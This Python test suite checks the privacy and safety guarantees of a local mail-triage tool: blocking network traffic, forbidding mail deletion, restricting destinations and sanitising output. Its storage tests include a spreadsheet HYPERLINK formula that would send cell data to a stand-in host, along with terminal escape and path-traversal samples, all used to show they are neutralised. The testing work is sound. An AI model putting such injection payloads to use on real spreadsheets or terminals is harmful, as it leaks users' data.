"""Privacy and safety guarantees. If one of these fails, do not ship."""

from pathlib import Path
import re
import socket
import stat
import subprocess
import sys
import unittest

from helpers import FIXTURES, TempHome, default_config

from mail_triage import privacy
from mail_triage.backends.systemone import SystemOneBackend
from mail_triage.backends.base import BackendError
from mail_triage.connectors.base import validate_destination


PACKAGE = Path(__file__).resolve().parent.parent / "mail_triage"


class NetworkGuardTest(unittest.TestCase):
    def test_guard_blocks_outbound_in_a_fresh_process(self):
        code = ("import socket, urllib.request\n"
                "from mail_triage import privacy\n"
                "privacy.install_network_guard()\n"
                "for target in [('1.1.1.1', 443), ('8.8.8.8', 53)]:\n"
                "    s = socket.socket()\n"
                "    try:\n        s.connect(target); print('LEAK')\n"
                "    except privacy.NetworkBlocked: print('blocked')\n"
                "try:\n    urllib.request.urlopen('https://example.com', timeout=2); print('LEAK')\n"
                "except Exception: print('blocked')\n"
                "s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n"
                "try:\n    s.sendto(b'x', ('9.9.9.9', 53)); print('LEAK')\n"
                "except privacy.NetworkBlocked: print('blocked')\n"
                "s = socket.socket(); print('local', s.connect_ex(('127.0.0.1', 9)) != None)\n")
        out = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True,
                             cwd=PACKAGE.parent, timeout=30).stdout
        self.assertNotIn("LEAK", out)
        self.assertEqual(out.count("blocked"), 4)
        self.assertIn("local True", out)

    def test_local_host_detection(self):
        for host in ("127.0.0.1", "::1", "localhost", "127.5.5.5", None):
            self.assertTrue(privacy.is_local_host(host), host)
        for host in ("example.com", "10.0.0.1", "192.168.1.1", "8.8.8.8"):
            self.assertFalse(privacy.is_local_host(host), host)

    def test_systemone_refuses_remote_servers(self):
        with self.assertRaises(BackendError):
            SystemOneBackend("http://192.168.1.20:8080")

    def test_every_command_touching_mail_installs_the_guard(self):
        source = (PACKAGE / "cli.py").read_text()
        for command in ("cmd_scan", "cmd_report", "cmd_doctor", "cmd_teach"):
            body = source.split(f"def {command}(")[1].split("\ndef ")[0]
            self.assertIn("install_network_guard()", body, command)
        worker = (PACKAGE / "mlx_worker.py").read_text()
        self.assertLess(worker.index("install_network_guard()"), worker.index("import laya_mlx"))


class NoDeletionTest(unittest.TestCase):
    def test_no_code_can_delete_or_trash_mail(self):
        forbidden = re.compile(r"\.(delete|trash|expunge)\(|deleteMessage|\bdelete\s*\(|junk mail status|"
                               r"set deleted|flag.*deleted|move to trash", re.I)
        for path in (PACKAGE / "connectors").glob("*.py"):
            self.assertIsNone(forbidden.search(path.read_text()), path.name)

    def test_destinations_are_restricted(self):
        actions = default_config().actions
        self.assertEqual(validate_destination("Laya/Promotions", actions), "Laya/Promotions")
        for bad in ("Trash", "Junk/Laya", "Deleted Items", "Inbox", "Laya/../Trash", "", "Other/Promo"):
            with self.assertRaises(ValueError, msg=bad):
                validate_destination(bad, actions)
        allowed = {**actions, "also_allowed": ["Finance/Invoices"]}
        self.assertEqual(validate_destination("Finance/Invoices", allowed), "Finance/Invoices")


class ScriptInjectionTest(unittest.TestCase):
    def test_applemail_scripts_take_arguments_not_interpolation(self):
        source = (PACKAGE / "connectors" / "applemail.py").read_text()
        self.assertNotIn("f\"\"\"", source)
        self.assertNotIn(".format(", source)
        self.assertIn("argv[0]", source)
        self.assertNotIn("shell=True", "".join(p.read_text() for p in PACKAGE.rglob("*.py")))


class StorageTest(unittest.TestCase):
    def test_history_and_reports_are_private(self):
        from mail_triage import report
        from mail_triage.store import Store
        with TempHome() as home:
            store = Store(home / "history.sqlite")
            html_path, csv_path = report.write(store, default_config(), home / "reports")
            for path in (home / "history.sqlite", html_path, csv_path):
                self.assertEqual(stat.S_IMODE(path.stat().st_mode), 0o600, path)
            self.assertEqual(stat.S_IMODE((home / "reports").stat().st_mode), 0o700)
            self.assertIn("default-src 'none'", html_path.read_text())
            store.close()

    def test_fixtures_contain_no_real_domains(self):
        for path in FIXTURES.glob("*.eml"):
            for address in re.findall(r"[\w.+-]+@([\w.-]+)", path.read_text(errors="replace")):
                self.assertRegex(address, r"(^|\.)example(\.(com|net|org|cz))?$|\.test$", f"{path.name}: {address}")

    def test_csv_and_terminal_injection_are_neutralised(self):
        self.assertEqual(privacy.csv_safe('=HYPERLINK("http://x.example/?"&A1)')[0], "'")
        self.assertEqual(privacy.csv_safe("-50% sale")[:2], "'-")
        self.assertEqual(privacy.csv_safe("Normal subject"), "Normal subject")
        self.assertNotIn("\x1b", privacy.printable("Hi \x1b[2J\x1b]0;evil\x07 there"))

    def test_redaction(self):
        self.assertEqual(privacy.redact_sender("jan.novak@company.example"), "jan…@company.example")
        self.assertNotIn("Terraform", privacy.redact_subject("Re: Terraform PR review"))


if __name__ == "__main__":
    unittest.main()
